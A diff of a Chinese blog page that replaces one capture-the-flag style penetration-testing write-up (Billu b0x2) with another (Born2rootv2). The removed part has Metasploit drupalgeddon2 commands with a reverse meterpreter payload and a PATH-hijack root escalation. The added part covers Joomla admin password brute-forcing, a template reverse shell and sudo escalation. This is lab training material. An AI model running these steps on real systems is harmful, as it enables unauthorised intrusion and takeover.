@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
-<title>渗透测试之Billu b0x2 | DAMOXILAI</title>
+<title>渗透测试之Born2rootv2 | DAMOXILAI</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1629457535538">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -41,8 +41,8 @@
 
 
 
-  <meta name="description" content="渗透测试之Billu b0x2" />
-  <meta name="keywords" content="内网渗透" />
+  <meta name="description" content="渗透测试之Born2rootv2" />
+  <meta name="keywords" content="" />
 </head>
 
 <body>
@@ -255,10 +255,14 @@
 *<br>
 * <a href="#1%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0">1.主机发现</a><br>
 * <a href="#2%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3">2.扫描端口</a><br>
-* <a href="#3%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">3.访问网页</a><br>
-* <a href="#4drupal%E6%BC%8F%E6%B4%9E">4.Drupal漏洞</a><br>
-* <a href="#5%E6%8F%90%E6%9D%83">5.提权</a></li>
-<li><a href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93">三、实验总结</a></li>
+* <a href="#3%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3">3.访问80端口</a><br>
+* <a href="#4%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95">4.扫描目录</a><br>
+* <a href="#6%E7%BB%A7%E7%BB%AD%E6%89%AB%E6%8F%8F%E6%BC%8F%E6%B4%9Ejoomscan">6.继续扫描漏洞（joomscan）</a><br>
+* <a href="#7%E7%88%86%E7%A0%B4joomla%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E5%AF%86%E7%A0%81">7.爆破joomla管理员的密码</a><br>
+* <a href="#8%E8%8E%B7%E5%8F%96shell">8.获取shell</a><br>
+* <a href="#9ssh%E7%99%BB%E9%99%86">9.ssh登陆</a><br>
+* <a href="#10%E6%8F%90%E6%9D%83">10.提权</a></li>
+<li><a href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83">三、实验环境</a></li>
 </ul>
 </li>
 </ul>
@@ -526,8 +530,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/">
-      渗透测试之Billu b0x2
+    <a class="post-title-link" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-born2rootv2/">
+      渗透测试之Born2rootv2
     </a>
   </h1>
   <div class="post-meta">
@@ -535,31 +539,18 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2021-08-18 00:00:03">2021-08-18</span>
+      <span class="publish-time" data-t="2021-08-20 18:58:28">2021-08-20</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
     <span class="meta-item">
-      <i class="fa fa-folder-o"></i>
-      <span class="pc-show language" data-lan="category-in">分类于</span>
-      
-      
-      <a href="https://damoxilai.github.io/tag/ZkSgQhLUS/">
-        <span>内网渗透</span>
-      </a>
-      
-      
-    </span>
-    <span class="post-meta-divider">|</span>
-    
-    <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>2<span class="language" data-lan="minute">分钟</span></span>
+      <span>3<span class="language" data-lan="minute">分钟</span></span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>439<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>446<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
   </div>
@@ -572,68 +563,83 @@
 </ol>
 <h2 id="二-实验过程">二、实验过程</h2>
 <h5 id="1主机发现">1.主机发现</h5>
-<p>扫描，发现靶机ip192.168.0.103</p>
-<figure data-type="image" tabindex="1"><img src="https://damoxilai.github.io/post-images/1629216074795.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://damoxilai.github.io/post-images/1629457211814.png" alt="" loading="lazy"></figure>
 <h5 id="2扫描端口">2.扫描端口</h5>
-<p>开放22、80、111、8080端口；linux系统<br>
-<img src="https://damoxilai.github.io/post-images/1629216087993.png" alt="" loading="lazy"></p>
-<h5 id="3访问网页">3.访问网页</h5>
-<figure data-type="image" tabindex="2"><img src="https://damoxilai.github.io/post-images/1629216096684.png" alt="" loading="lazy"></figure>
-<p>看到是“Drupal”框架大搭起来的网站</p>
-<h5 id="4drupal漏洞">4.Drupal漏洞</h5>
-<p>我们可以用msf5来搜索漏洞，依次输入以下命令</p>
-<pre><code>┌──(root💀kali)-[~/桌面]
-└─# msfconsole          
-
-msf6 &gt; search Drupal
-
-msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2
-
-msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.0.103
-
-msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set Payload php/meterpreter/reverse_tcp
-
-msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set LHOST 192.168.0.150
-
-msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit
+<p>开放22、80、111、8080端口；linux系统</p>
+<figure data-type="image" tabindex="2"><img src="https://damoxilai.github.io/post-images/1629457362925.png" alt="" loading="lazy"></figure>
+<h5 id="3访问80端口">3.访问80端口</h5>
+<figure data-type="image" tabindex="3"><img src="https://damoxilai.github.io/post-images/1629457371381.png" alt="" loading="lazy"></figure>
+<h5 id="4扫描目录">4.扫描目录</h5>
+<pre><code>gobuster dir -u http://192.168.0.103 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 15
 </code></pre>
-<p>获得shell</p>
-<figure data-type="image" tabindex="3"><img src="https://damoxilai.github.io/post-images/1629216104998.png" alt="" loading="lazy"></figure>
-<h5 id="5提权">5.提权</h5>
-<p>5.1上传脚本运行将meterpreter shell转为反弹shell</p>
-<p>下载地址:https://github.com/rebootuser/LinEnum</p>
-<pre><code>meterpreter &gt; upload /root/LinEnum.sh /tmp/
-[*] uploading  : /root/LinEnum.sh -&gt; /tmp/                                                                                        
-[*] uploaded   : /root/LinEnum.sh -&gt; /tmp//LinEnum.sh                                                                             
-meterpreter &gt; shell                                                                                                               
-Process 2208 created.                                                                                                             
-Channel 1 created.      
-
+<figure data-type="image" tabindex="4"><img src="https://damoxilai.github.io/post-images/1629457380603.png" alt="" loading="lazy"></figure>
+<p>发现网站开启了joomla框架（使用PHP和Mysql所开发的内容管理系统）</p>
+<figure data-type="image" tabindex="5"><img src="https://damoxilai.github.io/post-images/1629457390887.png" alt="" loading="lazy"></figure>
+<p>访问该目录http://192.168.0.103/joomla</p>
+<figure data-type="image" tabindex="6"><img src="https://damoxilai.github.io/post-images/1629457398645.png" alt="" loading="lazy"></figure>
+<h5 id="6继续扫描漏洞joomscan">6.继续扫描漏洞（joomscan）</h5>
+<p>下载joomscan</p>
+<pre><code>git clone https://github.com/rezasp/joomscan.git 
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://damoxilai.github.io/post-images/1629216115061.png" alt="" loading="lazy"></figure>
-<p>5.2在根目录下，寻找可提权程序</p>
-<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+<p>扫描</p>
+<pre><code>perl joomscan/joomscan.pl -u http://192.168.0.103/         
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://damoxilai.github.io/post-images/1629216121658.png" alt="" loading="lazy"></figure>
-<p>发现/opt/s符合条件</p>
-<p>5.3strings查看</p>
-<p><img src="https://damoxilai.github.io/post-images/1629216130170.png" alt="" loading="lazy"><br>
-发现s会调用scp命令，并且为root权限。</p>
-<p>在/tmp目录下建立scp文件，赋予可执行权限，把它添加到环境变量中，这样执行/opt/s时，运行到scp时，就会执行我们在/tmp目录下建立的scp。</p>
-<p>写下scp，赋予权限</p>
-<pre><code>echo '/bin/bash' &gt; /tmp/scp                                  
-chmod +x /tmp/scp
-</code></pre>
-<p>查看$PATH,把“/tmp”添加进变量</p>
-<pre><code>PATH=/tmp:$PATH
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://damoxilai.github.io/post-images/1629216138611.png" alt="" loading="lazy"></figure>
-<p>运行/opt/s；注意这里不用&quot;./&quot;直接文件名就运行</p>
-<figure data-type="image" tabindex="7"><img src="https://damoxilai.github.io/post-images/1629216145964.png" alt="" loading="lazy"></figure>
-<h2 id="三-实验总结">三、实验总结</h2>
-<p>(1)MSF需熟悉应用，直接搜索漏洞，也有写好的exploit脚本</p>
-<p>(2)meterpreter shell的实现，meterperter命令，包括meterperter shell转反弹shell</p>
-<p>(3)$PATH决定了shell将到那些目录中寻找命令或程序，修改$PATH是scp命令实现运行的关键</p>
+<figure data-type="image" tabindex="7"><img src="https://damoxilai.github.io/post-images/1629457413680.png" alt="" loading="lazy"></figure>
+<p>通过扫描，可以发现管理员页面网址</p>
+<figure data-type="image" tabindex="8"><img src="https://damoxilai.github.io/post-images/1629457422029.png" alt="" loading="lazy"></figure>
+<h5 id="7爆破joomla管理员的密码">7.爆破joomla管理员的密码</h5>
+<p>先通过cewl爬取网站获取关键信息创建一个密码字典</p>
+<figure data-type="image" tabindex="9"><img src="https://damoxilai.github.io/post-images/1629457432305.png" alt="" loading="lazy"></figure>
+<p>然后 利用burp抓包爆破</p>
+<figure data-type="image" tabindex="10"><img src="https://damoxilai.github.io/post-images/1629457441708.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://damoxilai.github.io/post-images/1629457452782.png" alt="" loading="lazy"></figure>
+<p>刷新页面，爆破成功<br>
+<img src="https://damoxilai.github.io/post-images/1629457462575.png" alt="" loading="lazy"><br>
+进入后台</p>
+<h5 id="8获取shell">8.获取shell</h5>
+<p>修改模板beez3<br>
+<img src="https://damoxilai.github.io/post-images/1629457471929.png" alt="" loading="lazy"></p>
+<p>写入反弹sell</p>
+<figure data-type="image" tabindex="12"><img src="https://damoxilai.github.io/post-images/1629457480253.png" alt="" loading="lazy"></figure>
+<p>开启beez3</p>
+<figure data-type="image" tabindex="13"><img src="https://damoxilai.github.io/post-images/1629457488907.png" alt="" loading="lazy"></figure>
+<p>开启监听，访问http://192.168.0.103/joomla/templates/beez3/error.php，获得反弹shell</p>
+<figure data-type="image" tabindex="14"><img src="https://damoxilai.github.io/post-images/1629457496251.png" alt="" loading="lazy"></figure>
+<h5 id="9ssh登陆">9.ssh登陆</h5>
+<p>在/opt/scripts下找到fileshare.py文件</p>
+<blockquote>
+<p>www-data@born2root:/opt/scripts$ <font color='orange'>cat fileshare.py</font><br>
+cat fileshare.py<br>
+#!/usr/bin/env python</p>
+<p>import sys, paramiko</p>
+<p>if len(sys.argv) &lt; 5:<br>
+print &quot;args missing&quot;<br>
+sys.exit(1)</p>
+<p>hostname = &quot;localhost&quot;<br>
+password = &quot;<font color='red'>lulzlol</font>&quot;<br>
+source = &quot;/var/www/html/joomla&quot;<br>
+dest = &quot;/tmp/backup/joomla&quot;</p>
+<p>username = &quot;<font color='red'>tim</font>&quot;<br>
+port = <font color='red'>22</font></p>
+<p>try:<br>
+t = paramiko.Transport((hostname, port))<br>
+t.connect(username=username, password=password)<br>
+sftp = paramiko.SFTPClient.from_transport(t)<br>
+sftp.get(source, dest)</p>
+<p>finally:<br>
+t.close()</p>
+</blockquote>
+<p>拿到ssh账号密码</p>
+<p>登陆</p>
+<figure data-type="image" tabindex="15"><img src="https://damoxilai.github.io/post-images/1629457514738.png" alt="" loading="lazy"></figure>
+<h5 id="10提权">10.提权</h5>
+<p><font color='red'>sudo -l</font>，输入tim的密码，再<font color='red'>sudo -s</font>成为root权限</p>
+<figure data-type="image" tabindex="16"><img src="https://damoxilai.github.io/post-images/1629457522326.png" alt="" loading="lazy"></figure>
+<p>拿到flag</p>
+<figure data-type="image" tabindex="17"><img src="https://damoxilai.github.io/post-images/1629457530342.png" alt="" loading="lazy"></figure>
+<h2 id="三-实验环境">三、实验环境</h2>
+<p>流程大概就是直接爆破admin密码，从而进入后台，获取网站控制权，进而提高到靶机控制权。要的是以下操作能力。</p>
+<p>cewl抓取字典，burpsuite的intrude密码爆破的使用，php反弹shell，ssh提权</p>
 
             </div>
             
@@ -646,7 +652,7 @@ chmod +x /tmp/scp
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/" title="渗透测试之Billu b0x2">https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/</a>
+      <a href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-born2rootv2/" title="渗透测试之Born2rootv2">https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-born2rootv2/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -655,21 +661,15 @@ chmod +x /tmp/scp
   </ul>
   <div class="tags">
     
-      <a href="https://damoxilai.github.io/tag/ZkSgQhLUS/"># 内网渗透</a>
-    
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="渗透测试之Born2rootv2" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-born2rootv2/">渗透测试之Born2rootv2</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="渗透测试之Born2rootv2" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-born2rootv2/">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="渗透测试之Android4" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/">渗透测试之Android4</a>
-        <a class="nav-mobile-next" title="渗透测试之Android4" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-android4/">下一篇</a>
+        <a class="nav-pc-next" title="渗透测试之Billu b0x2" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/">渗透测试之Billu b0x2</a>
+        <a class="nav-mobile-next" title="渗透测试之Billu b0x2" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-billu-b0x2/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
